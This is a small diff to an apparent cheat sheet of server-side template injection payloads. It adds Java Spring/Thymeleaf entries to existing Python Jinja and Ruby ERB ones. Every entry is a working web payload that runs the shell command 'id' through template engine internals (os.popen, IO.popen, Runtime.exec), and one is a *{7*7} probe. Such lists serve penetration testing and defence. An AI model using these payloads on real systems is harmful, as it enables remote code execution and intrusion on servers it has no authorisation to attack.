@@ -1,5 +1,9 @@
-# Python Jinja - execute command
+# Python Jinja
 {{cycler.__init__.__globals__.os.popen("id").read()}}
 
-# Ruby ERB - execute command
+# Ruby ERB
 <%= IO.popen("id").readlines() %>
+
+# Java Spring with Thymeleaf
+*{7*7}
+*{T(java.lang.Runtime).getRuntime().exec("id")}
